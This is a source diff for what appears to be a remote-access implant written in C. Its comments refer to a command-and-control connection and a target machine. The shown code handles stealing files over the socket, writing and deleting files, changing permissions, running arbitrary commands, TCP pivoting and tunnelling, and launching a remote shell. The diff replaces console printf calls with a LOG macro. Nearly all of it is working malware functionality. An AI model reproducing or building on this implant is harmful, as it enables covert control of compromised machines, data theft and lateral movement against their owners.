@@ -11,7 +11,6 @@
 */
 
 #include <sys/types.h>
-#include <stdio.h>
 #include <unistd.h>
 #include <stdlib.h>
 #include <string.h>
@@ -24,6 +23,7 @@
 #include <arpa/inet.h>
 #include <netdb.h>
 
+#include "common.h"
 #include "shell.h"
 #include "tcp.h"
 #include "file.h"
@@ -52,7 +52,7 @@ int command_loop(Parser *p)
         // Kill command. Just kill the current process.
         // Global cleanup will be handled by the atexit routine.
         case CMD_SYSTEM_EXIT:
-            printf("User requested termination.\n");
+            LOG("User requested termination.\n");
             parser_ok(p);
             parser_close(p);
             return 1;
@@ -66,7 +66,7 @@ int command_loop(Parser *p)
         // This command reuses the C&C connection.
         case CMD_SYSTEM_SHELL:
             do_system_shell(p);
-            printf("Channel reused, reconnecting...\n");
+            LOG("Channel reused, reconnecting...\n");
             return 0;
 
         // Grab a file from the target machine.
@@ -103,12 +103,12 @@ int command_loop(Parser *p)
         // This command reuses the C&C connection.
         case CMD_TCP_PIVOT:
             do_tcp_pivot(p);
-            printf("Channel reused, reconnecting...\n");
+            LOG("Channel reused, reconnecting...\n");
             return 0;
 
         // Unsupported command.
         default:
-            printf("Unsupported command: 0x%4x 0x%04x 0x%08x\n", p->header.cmd_id, p->header.cmd_len, p->header.data_len);
+            LOG("Unsupported command: 0x%4x 0x%04x 0x%08x\n", p->header.cmd_id, p->header.cmd_len, p->header.data_len);
             parser_error(p, "not supported");
             break;
         }
@@ -132,12 +132,12 @@ void do_file_read(Parser *p)
 
     // Make sure we have read access to the file.
     if (access(filename, F_OK) == -1) {
-        printf("Cannot find %s\n", filename);
+        LOG("Cannot find %s\n", filename);
         parser_error(p, "file not found");
         return;
     }
     if (access(filename, R_OK) == -1) {
-        printf("Cannot read %s\n", filename);
+        LOG("Cannot read %s\n", filename);
         parser_error(p, "file not readable");
         return;
     }
@@ -145,7 +145,7 @@ void do_file_read(Parser *p)
     // Open the file.
     file = open(filename, O_RDONLY);
     if (file < 0) {
-        printf("Cannot open %s\n", filename);
+        LOG("Cannot open %s\n", filename);
         parser_error(p, "cannot open file");
         return;
     }
@@ -154,27 +154,27 @@ void do_file_read(Parser *p)
     info.st_size = 0;
     stat(filename, &info);
     if (info.st_size == 0) {
-        printf("Cannot stat or empty file %s\n", filename);
+        LOG("Cannot stat or empty file %s\n", filename);
         parser_error(p, "cannot stat or empty file");
         return;
     }
 
     // Make sure the file isn't too big to send.
     if (info.st_size > UINT32_MAX) {
-        printf("File too large %s\n", filename);
+        LOG("File too large %s\n", filename);
         parser_error(p, "file too large");
         return;
     }
 
     // Send the file in the response.
     // Close the connection if something goes wrong at this point.
-    printf("Reading file %s\n", filename);
+    LOG("Reading file %s\n", filename);
     parser_begin_response(p, CMD_STATUS_OK, info.st_size);
     if (copy_stream(file, p->fd, info.st_size) < 0) {
         parser_close(p);
-        printf("Error sending file (%ld bytes)\n", info.st_size);
+        LOG("Error sending file (%ld bytes)\n", info.st_size);
     } else {
-        printf("Success (%ld bytes)\n", info.st_size);
+        LOG("Success (%ld bytes)\n", info.st_size);
     }
     close(file);
 }
@@ -212,7 +212,7 @@ void do_file_write(Parser *p)
     // Open the file for writing.
     file = open(filename, O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0777);
     if (file < 0) {
-        printf("Cannot open %s\n", filename);
+        LOG("Cannot open %s\n", filename);
         parser_error(p, "cannot open file");
         return;
     }
@@ -221,15 +221,15 @@ void do_file_write(Parser *p)
     chmod(filename, 0777);
 
     // Save the file data as it comes from the socket.
-    printf("Writing file %s\n", filename);
+    LOG("Writing file %s\n", filename);
     success = copy_stream(p->fd, file, p->header.data_len);
     close(file);
     if (success < 0) {
-        printf("Error receiving file (%d bytes)\n", p->header.data_len);
+        LOG("Error receiving file (%d bytes)\n", p->header.data_len);
         parser_error(p, "failed to write file");
         parser_close(p);
     } else {
-        printf("Success (%d bytes)\n", p->header.data_len);
+        LOG("Success (%d bytes)\n", p->header.data_len);
         parser_ok(p);
     }
     p->header.data_len = 0;     // Make sure to reset this counter!
@@ -247,10 +247,10 @@ void do_file_delete(Parser *p)
 
     // Delete the file.
     if (unlink(filename) < 0) {
-        printf("Error deleting file %s\n", filename);
+        LOG("Error deleting file %s\n", filename);
         parser_error(p, "could not delete");
     } else {
-        printf("Deleted file %s\n", filename);
+        LOG("Deleted file %s\n", filename);
         parser_ok(p);
     }
 }
@@ -262,12 +262,12 @@ void do_file_chmod(Parser *p)
 
     // First two bytes of the first argument are the mode flags in network byte order.
     if (p->header.cmd_len < sizeof(mode) + 2) {
-        printf("Malformed chmod command block\n");
+        LOG("Malformed chmod command block\n");
         parser_error(p, "malformed command block");
         parser_close(p);
     }
     if (recv_block(p->fd, (char *) &mode, sizeof(mode)) < 0) {
-        printf("Malformed chmod command block\n");
+        LOG("Malformed chmod command block\n");
         parser_error(p, "malformed command block");
         parser_close(p);
     }
@@ -282,10 +282,10 @@ void do_file_chmod(Parser *p)
 
     // Chmod the file.
     if (chmod(filename, mode) < 0) {
-        printf("Error changing file mode to %03o %s\n", mode, filename);
+        LOG("Error changing file mode to %03o %s\n", mode, filename);
         parser_error(p, "could not chmod");
     } else {
-        printf("Changed file mode to %03o %s\n", mode, filename);
+        LOG("Changed file mode to %03o %s\n", mode, filename);
         parser_ok(p);
     }
 }
@@ -303,14 +303,14 @@ void do_file_exec(Parser *p)
     }
 
     // Execute the command.
-    printf("Executing: %s\n", command);
+    LOG("Executing: %s\n", command);
     if (run_simple_command(command, (char *) buffer, sizeof(buffer))) {
-        printf("Success\n");
+        LOG("Success\n");
         buffer_length = strlen(buffer);
         parser_begin_response(p, CMD_STATUS_OK, buffer_length);
         send_block(p->fd, buffer, buffer_length);
     } else {
-        printf("Error\n");
+        LOG("Error\n");
         parser_error(p, "could not execute");
     }
 }
@@ -329,9 +329,9 @@ void do_dns_resolve(Parser *p)
     }
 
     // Resolve the domain name.
-    printf("Resolving domain %s\n", (const char *) &p->buffer);
+    LOG("Resolving domain %s\n", (const char *) &p->buffer);
     if (getaddrinfo((const char *) &p->buffer, NULL, NULL, &result) != 0) {
-        printf("Failed to resolve domain\n");
+        LOG("Failed to resolve domain\n");
         parser_error(p, "could not resolve domain name");
         return;
     }
@@ -351,7 +351,7 @@ void do_dns_resolve(Parser *p)
             entries++;
         }
     }
-    printf("Found %d address(es)\n", entries);
+    LOG("Found %d address(es)\n", entries);
 
     // Send the response.
     parser_begin_response(p, CMD_STATUS_OK, resp_size);
@@ -374,7 +374,7 @@ void do_tcp_pivot(Parser *p)
 
     // Read the TCP pivot options structure.
     if (p->header.cmd_len != sizeof(CMD_TCP_PIVOT_ARGS) || parser_read_first_arg(p, (char *) &p->buffer, sizeof(CMD_TCP_PIVOT_ARGS)) < 0) {
-        printf("Malformed TCP pivot request\n");
+        LOG("Malformed TCP pivot request\n");
         parser_error(p, "malformed request");
         parser_close(p);
         return;
@@ -391,15 +391,15 @@ void do_tcp_pivot(Parser *p)
     sa.sin_port = pivot->port;
     memcpy((void *) &sa.sin_addr, (void *) &pivot->ip, sizeof(sa.sin_addr));
     if (pivot->from_port != 0) {
-        printf("Pivoting to %s:%d from port %d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port), ntohs(pivot->from_port));
+        LOG("Pivoting to %s:%d from port %d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port), ntohs(pivot->from_port));
     } else {
-        printf("Pivoting to %s:%d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port));
+        LOG("Pivoting to %s:%d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port));
     }
     if (connect_socket(sock, (const struct sockaddr *) &sa, sizeof(sa)) < 0) {
         if (pivot->from_port != 0) {
-            printf("Can not connect to %s:%d from port %d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port), ntohs(pivot->from_port));
+            LOG("Can not connect to %s:%d from port %d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port), ntohs(pivot->from_port));
         } else {
-            printf("Can not connect to %s:%d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port));
+            LOG("Can not connect to %s:%d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port));
         }
         parser_error(p, "connection refused");
         return;
@@ -431,9 +431,9 @@ void do_tcp_pivot(Parser *p)
 
         // Log the event.
         if (pivot->from_port != 0) {
-            printf("Launched TCP tunnel to %s:%d from port %d\n", inet_ntoa(sa.sin_addr), pivot->port, pivot->from_port);
+            LOG("Launched TCP tunnel to %s:%d from port %d\n", inet_ntoa(sa.sin_addr), pivot->port, pivot->from_port);
         } else {
-            printf("Launched TCP tunnel to %s:%d\n", inet_ntoa(sa.sin_addr), pivot->port);
+            LOG("Launched TCP tunnel to %s:%d\n", inet_ntoa(sa.sin_addr), pivot->port);
         }
 
         // Close the socket object and reconnect.
@@ -487,7 +487,7 @@ void do_system_shell(Parser *p)
 
     // Test if the file actually exists and we have execution permission.
     if (access(shell, X_OK) == -1) {
-        printf("Cannot find a shell for the current user\n");
+        LOG("Cannot find a shell for the current user\n");
         parser_error(p, "no shell available");
         return;
     }
@@ -517,5 +517,5 @@ void do_system_shell(Parser *p)
         parser_close(p);
 
     }
-    printf("Launched remote shell\n");
+    LOG("Launched remote shell\n");
 }
